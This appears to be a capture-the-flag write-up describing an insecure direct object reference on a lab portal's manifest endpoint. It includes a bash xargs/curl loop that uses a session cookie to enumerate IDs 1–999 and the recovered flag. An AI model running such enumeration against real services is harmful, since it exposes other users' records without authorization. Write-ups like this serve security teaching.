# AetherCorp Courier Manifests

The portal on port 8082 had a `manifest?id=` endpoint. Guessing around the small numbers gave normal "no executive cargo" pages, but the IDs were clearly sequential and the app did not check that the manifest belonged to the logged-in account.

I enumerated the whole range with a small `xargs` loop:

```bash
seq 1 999 | xargs -P 25 -I{} sh -c   'curl -s -H "Cookie: $SESSION" "http://target:8082/manifest?id={}"    | grep -qiE "AIT\{|flag" && { echo "### {}";    curl -s -H "Cookie: $SESSION" "http://target:8082/manifest?id={}"; }'
```

Most IDs returned the same empty page. ID `237` returned:

`AIT{tr4ck1ng_numb3r_3num3r4t10n_fTw}`

The flag text is a hint about the bug: the tracking numbers were enumerable, and the access check was only on the UI, not on the manifest endpoint.
